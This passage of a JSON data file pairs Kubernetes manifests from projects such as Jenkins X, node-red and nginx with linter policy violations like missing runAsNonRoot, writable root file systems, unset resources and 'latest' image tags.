    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-keeper\n  labels:\n    chart: lighthouse-1.1.52\n    app: lighthouse-keeper\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-keeper\n  template:\n    metadata:\n      annotations:\n        ad.datadoghq.com/keeper.logs: '[{\"source\":\"lighthouse\",\"service\":\"keeper\"}]'\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: bb5f39e236b36b3228ab10714f06b20b0d7e5993278b21642c236d2fea80e769\n      labels:\n        app: lighthouse-keeper\n    spec:\n      serviceAccountName: lighthouse-keeper\n      containers:\n      - name: lighthouse-keeper\n        image: ghcr.io/jenkins-x/lighthouse-keeper:1.1.52\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        ports:\n        - name: http\n          containerPort: 8888\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: http\n          initialDelaySeconds: 120\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: ioachim.lihor\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.52\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: LIGHTHOUSE_KEEPER_STATUS_CONTEXT_LABEL\n          value: Lighthouse Merge Status\n        - name: LIGHTHOUSE_TRIGGER_ON_MISSING\n          value: enable\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 400m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-keeper\" is not set to runAsNonRoot"
  },
  {
    "id": "10248",
    "manifest_path": "data/manifests/the_stack_sample/sample_3953.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcpods\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcpods\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcpods\n        containers:\n        - name: gcpods\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - pods\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.256\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"gcpods\" does not have a read-only root file system"
  },
  {
    "id": "10249",
    "manifest_path": "data/manifests/the_stack_sample/sample_3953.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcpods\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcpods\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcpods\n        containers:\n        - name: gcpods\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - pods\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.256\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jx-gcpods\" not found"
  },
  {
    "id": "10250",
    "manifest_path": "data/manifests/the_stack_sample/sample_3953.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcpods\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcpods\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcpods\n        containers:\n        - name: gcpods\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - pods\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.256\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"gcpods\" is not set to runAsNonRoot"
  },
  {
    "id": "10251",
    "manifest_path": "data/manifests/the_stack_sample/sample_3953.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcpods\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcpods\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcpods\n        containers:\n        - name: gcpods\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - pods\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.256\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"gcpods\" has cpu request 0"
  },
  {
    "id": "10252",
    "manifest_path": "data/manifests/the_stack_sample/sample_3953.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcpods\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcpods\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcpods\n        containers:\n        - name: gcpods\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - pods\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.256\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"gcpods\" has memory limit 0"
  },
  {
    "id": "10253",
    "manifest_path": "data/manifests/the_stack_sample/sample_3957.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: gameoflife\nspec:\n  selector:\n    app: gameoflife\n    ver: 1.0.0\n  type: LoadBalancer\n  ports:\n  - port: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:gameoflife ver:1.0.0])"
  },
  {
    "id": "10254",
    "manifest_path": "data/manifests/the_stack_sample/sample_3958.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9868\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10255",
    "manifest_path": "data/manifests/the_stack_sample/sample_3958.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9868\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10256",
    "manifest_path": "data/manifests/the_stack_sample/sample_3958.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9868\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10257",
    "manifest_path": "data/manifests/the_stack_sample/sample_3958.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9868\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10258",
    "manifest_path": "data/manifests/the_stack_sample/sample_3958.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9868\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10259",
    "manifest_path": "data/manifests/the_stack_sample/sample_3959.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    application: stackset-controller\n  name: stackset-controller\n  namespace: kube-system\n  annotations:\n    prometheus.io/path: /metrics\n    prometheus.io/port: '7979'\n    prometheus.io/scrape: 'true'\nspec:\n  selector:\n    application: stackset-controller\n  type: ClusterIP\n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 7979\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[application:stackset-controller])"
  },
  {
    "id": "10260",
    "manifest_path": "data/manifests/the_stack_sample/sample_3960.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: node-red\n  name: node-red\n  namespace: nodered\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: node-red\n  template:\n    metadata:\n      labels:\n        app: node-red\n    spec:\n      containers:\n      - image: nodered/node-red:latest\n        imagePullPolicy: Always\n        name: node-red\n        ports:\n        - containerPort: 1880\n          name: nodered-tcp\n          protocol: TCP\n        resources: {}\n        env:\n        - name: TZ\n          value: Europe/Rome\n        - name: PGID\n          value: '1000'\n        - name: PUID\n          value: '1000'\n        - name: process.env.PORT\n          value: '10880'\n        volumeMounts:\n        - mountPath: /data\n          name: node-red-pvc\n          subPath: _nodered\n      volumes:\n      - name: node-red-pvc\n        persistentVolumeClaim:\n          claimName: node-red-pvc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"node-red\" is using an invalid container image, \"nodered/node-red:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10261",
    "manifest_path": "data/manifests/the_stack_sample/sample_3960.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: node-red\n  name: node-red\n  namespace: nodered\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: node-red\n  template:\n    metadata:\n      labels:\n        app: node-red\n    spec:\n      containers:\n      - image: nodered/node-red:latest\n        imagePullPolicy: Always\n        name: node-red\n        ports:\n        - containerPort: 1880\n          name: nodered-tcp\n          protocol: TCP\n        resources: {}\n        env:\n        - name: TZ\n          value: Europe/Rome\n        - name: PGID\n          value: '1000'\n        - name: PUID\n          value: '1000'\n        - name: process.env.PORT\n          value: '10880'\n        volumeMounts:\n        - mountPath: /data\n          name: node-red-pvc\n          subPath: _nodered\n      volumes:\n      - name: node-red-pvc\n        persistentVolumeClaim:\n          claimName: node-red-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"node-red\" does not have a read-only root file system"
  },
  {
    "id": "10262",
    "manifest_path": "data/manifests/the_stack_sample/sample_3960.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: node-red\n  name: node-red\n  namespace: nodered\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: node-red\n  template:\n    metadata:\n      labels:\n        app: node-red\n    spec:\n      containers:\n      - image: nodered/node-red:latest\n        imagePullPolicy: Always\n        name: node-red\n        ports:\n        - containerPort: 1880\n          name: nodered-tcp\n          protocol: TCP\n        resources: {}\n        env:\n        - name: TZ\n          value: Europe/Rome\n        - name: PGID\n          value: '1000'\n        - name: PUID\n          value: '1000'\n        - name: process.env.PORT\n          value: '10880'\n        volumeMounts:\n        - mountPath: /data\n          name: node-red-pvc\n          subPath: _nodered\n      volumes:\n      - name: node-red-pvc\n        persistentVolumeClaim:\n          claimName: node-red-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"node-red\" is not set to runAsNonRoot"
  },
  {
    "id": "10263",
    "manifest_path": "data/manifests/the_stack_sample/sample_3960.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: node-red\n  name: node-red\n  namespace: nodered\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: node-red\n  template:\n    metadata:\n      labels:\n        app: node-red\n    spec:\n      containers:\n      - image: nodered/node-red:latest\n        imagePullPolicy: Always\n        name: node-red\n        ports:\n        - containerPort: 1880\n          name: nodered-tcp\n          protocol: TCP\n        resources: {}\n        env:\n        - name: TZ\n          value: Europe/Rome\n        - name: PGID\n          value: '1000'\n        - name: PUID\n          value: '1000'\n        - name: process.env.PORT\n          value: '10880'\n        volumeMounts:\n        - mountPath: /data\n          name: node-red-pvc\n          subPath: _nodered\n      volumes:\n      - name: node-red-pvc\n        persistentVolumeClaim:\n          claimName: node-red-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"node-red\" has cpu request 0"
  },
  {
    "id": "10264",
    "manifest_path": "data/manifests/the_stack_sample/sample_3960.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: node-red\n  name: node-red\n  namespace: nodered\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: node-red\n  template:\n    metadata:\n      labels:\n        app: node-red\n    spec:\n      containers:\n      - image: nodered/node-red:latest\n        imagePullPolicy: Always\n        name: node-red\n        ports:\n        - containerPort: 1880\n          name: nodered-tcp\n          protocol: TCP\n        resources: {}\n        env:\n        - name: TZ\n          value: Europe/Rome\n        - name: PGID\n          value: '1000'\n        - name: PUID\n          value: '1000'\n        - name: process.env.PORT\n          value: '10880'\n        volumeMounts:\n        - mountPath: /data\n          name: node-red-pvc\n          subPath: _nodered\n      volumes:\n      - name: node-red-pvc\n        persistentVolumeClaim:\n          claimName: node-red-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"node-red\" has memory limit 0"
  },
  {
    "id": "10265",
    "manifest_path": "data/manifests/the_stack_sample/sample_3962.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-keeper\n  labels:\n    draft: draft-app\n    chart: lighthouse-0.0.882\n    app: lighthouse-keeper\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\n    jenkins-x.io/hash: 53a3585b9ba70371ddc9cd4d37d428cb8333502f1758cce1b8353dad2500222e\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      draft: draft-app\n      app: lighthouse-keeper\n  template:\n    metadata:\n      annotations:\n        ad.datadoghq.com/keeper.logs: '[{\"source\":\"lighthouse\",\"service\":\"keeper\"}]'\n      labels:\n        draft: draft-app\n        app: lighthouse-keeper\n    spec:\n      serviceAccountName: lighthouse-keeper\n      containers:\n      - name: lighthouse-keeper\n        image: gcr.io/jenkinsxio/lighthouse-keeper:0.0.882\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        ports:\n        - name: http\n          containerPort: 8888\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: http\n          initialDelaySeconds: 120\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: chris-mellard\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LIGHTHOUSE_KEEPER_STATUS_CONTEXT_LABEL\n          value: Lighthouse Merge Status\n        resources:\n          limits:\n            cpu: 400m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-keeper\" does not have a read-only root file system"
  },
  {
    "id": "10266",
    "manifest_path": "data/manifests/the_stack_sample/sample_3962.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-keeper\n  labels:\n    draft: draft-app\n    chart: lighthouse-0.0.882\n    app: lighthouse-keeper\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\n    jenkins-x.io/hash: 53a3585b9ba70371ddc9cd4d37d428cb8333502f1758cce1b8353dad2500222e\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      draft: draft-app\n      app: lighthouse-keeper\n  template:\n    metadata:\n      annotations:\n        ad.datadoghq.com/keeper.logs: '[{\"source\":\"lighthouse\",\"service\":\"keeper\"}]'\n      labels:\n        draft: draft-app\n        app: lighthouse-keeper\n    spec:\n      serviceAccountName: lighthouse-keeper\n      containers:\n      - name: lighthouse-keeper\n        image: gcr.io/jenkinsxio/lighthouse-keeper:0.0.882\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        ports:\n        - name: http\n          containerPort: 8888\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: http\n          initialDelaySeconds: 120\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: chris-mellard\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LIGHTHOUSE_KEEPER_STATUS_CONTEXT_LABEL\n          value: Lighthouse Merge Status\n        resources:\n          limits:\n            cpu: 400m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-keeper\" not found"
  },
  {
    "id": "10267",
    "manifest_path": "data/manifests/the_stack_sample/sample_3962.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-keeper\n  labels:\n    draft: draft-app\n    chart: lighthouse-0.0.882\n    app: lighthouse-keeper\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\n    jenkins-x.io/hash: 53a3585b9ba70371ddc9cd4d37d428cb8333502f1758cce1b8353dad2500222e\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      draft: draft-app\n      app: lighthouse-keeper\n  template:\n    metadata:\n      annotations:\n        ad.datadoghq.com/keeper.logs: '[{\"source\":\"lighthouse\",\"service\":\"keeper\"}]'\n      labels:\n        draft: draft-app\n        app: lighthouse-keeper\n    spec:\n      serviceAccountName: lighthouse-keeper\n      containers:\n      - name: lighthouse-keeper\n        image: gcr.io/jenkinsxio/lighthouse-keeper:0.0.882\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        ports:\n        - name: http\n          containerPort: 8888\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: http\n          initialDelaySeconds: 120\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: chris-mellard\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LIGHTHOUSE_KEEPER_STATUS_CONTEXT_LABEL\n          value: Lighthouse Merge Status\n        resources:\n          limits:\n            cpu: 400m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-keeper\" is not set to runAsNonRoot"
  },
  {
    "id": "10268",
    "manifest_path": "data/manifests/the_stack_sample/sample_3963.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: departure-board\nspec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: departure-board\n  template:\n    metadata:\n      labels:\n        app: departure-board\n    spec:\n      containers:\n      - name: departure-board\n        image: benfl3713/departure-board:latest\n        resources:\n          limits:\n            memory: 50Mi\n            cpu: 80m\n          requests:\n            memory: 50Mi\n            cpu: 80m\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"departure-board\" is using an invalid container image, \"benfl3713/departure-board:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10269",
    "manifest_path": "data/manifests/the_stack_sample/sample_3963.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: departure-board\nspec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: departure-board\n  template:\n    metadata:\n      labels:\n        app: departure-board\n    spec:\n      containers:\n      - name: departure-board\n        image: benfl3713/departure-board:latest\n        resources:\n          limits:\n            memory: 50Mi\n            cpu: 80m\n          requests:\n            memory: 50Mi\n            cpu: 80m\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 10 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10270",
    "manifest_path": "data/manifests/the_stack_sample/sample_3963.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: departure-board\nspec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: departure-board\n  template:\n    metadata:\n      labels:\n        app: departure-board\n    spec:\n      containers:\n      - name: departure-board\n        image: benfl3713/departure-board:latest\n        resources:\n          limits:\n            memory: 50Mi\n            cpu: 80m\n          requests:\n            memory: 50Mi\n            cpu: 80m\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"departure-board\" does not have a read-only root file system"
  },
  {
    "id": "10271",
    "manifest_path": "data/manifests/the_stack_sample/sample_3963.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: departure-board\nspec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: departure-board\n  template:\n    metadata:\n      labels:\n        app: departure-board\n    spec:\n      containers:\n      - name: departure-board\n        image: benfl3713/departure-board:latest\n        resources:\n          limits:\n            memory: 50Mi\n            cpu: 80m\n          requests:\n            memory: 50Mi\n            cpu: 80m\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"departure-board\" is not set to runAsNonRoot"
  },
  {
    "id": "10272",
    "manifest_path": "data/manifests/the_stack_sample/sample_3966.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jx-pipelines-visualizer\n  labels:\n    app.kubernetes.io/name: jx-pipelines-visualizer\n    app.kubernetes.io/instance: jx-pipelines-visualizer\n    helm.sh/chart: jx-pipelines-visualizer-1.1.4\n    app.kubernetes.io/version: latest\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: jx-pipelines-visualizer\n      app.kubernetes.io/instance: jx-pipelines-visualizer\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jx-pipelines-visualizer\n        app.kubernetes.io/instance: jx-pipelines-visualizer\n        helm.sh/chart: jx-pipelines-visualizer-1.1.4\n        app.kubernetes.io/version: latest\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: jx-pipelines-visualizer\n        image: gcr.io/jenkinsxio/jx-pipelines-visualizer:1.1.4\n        args:\n        - -namespace\n        - jx\n        - -resync-interval\n        - 60s\n        - -archived-logs-url-template\n        - gs://logs-tf-jx-top-drum-366632344bbc/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.log\n        - -archived-pipelines-url-template\n        - gs://logs-tf-jx-top-drum-366632344bbc/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.yaml\n        - -log-level\n        - INFO\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        volumeMounts:\n        - mountPath: /secrets/git\n          name: secrets-git\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: jx-pipelines-visualizer\n      volumes:\n      - name: secrets-git\n        secret:\n          defaultMode: 420\n          secretName: tekton-git\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jx-pipelines-visualizer\" does not have a read-only root file system"
  },
  {
    "id": "10273",
    "manifest_path": "data/manifests/the_stack_sample/sample_3966.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jx-pipelines-visualizer\n  labels:\n    app.kubernetes.io/name: jx-pipelines-visualizer\n    app.kubernetes.io/instance: jx-pipelines-visualizer\n    helm.sh/chart: jx-pipelines-visualizer-1.1.4\n    app.kubernetes.io/version: latest\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: jx-pipelines-visualizer\n      app.kubernetes.io/instance: jx-pipelines-visualizer\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jx-pipelines-visualizer\n        app.kubernetes.io/instance: jx-pipelines-visualizer\n        helm.sh/chart: jx-pipelines-visualizer-1.1.4\n        app.kubernetes.io/version: latest\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: jx-pipelines-visualizer\n        image: gcr.io/jenkinsxio/jx-pipelines-visualizer:1.1.4\n        args:\n        - -namespace\n        - jx\n        - -resync-interval\n        - 60s\n        - -archived-logs-url-template\n        - gs://logs-tf-jx-top-drum-366632344bbc/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.log\n        - -archived-pipelines-url-template\n        - gs://logs-tf-jx-top-drum-366632344bbc/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.yaml\n        - -log-level\n        - INFO\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        volumeMounts:\n        - mountPath: /secrets/git\n          name: secrets-git\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: jx-pipelines-visualizer\n      volumes:\n      - name: secrets-git\n        secret:\n          defaultMode: 420\n          secretName: tekton-git\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jx-pipelines-visualizer\" not found"
  },
  {
    "id": "10274",
    "manifest_path": "data/manifests/the_stack_sample/sample_3966.yaml",
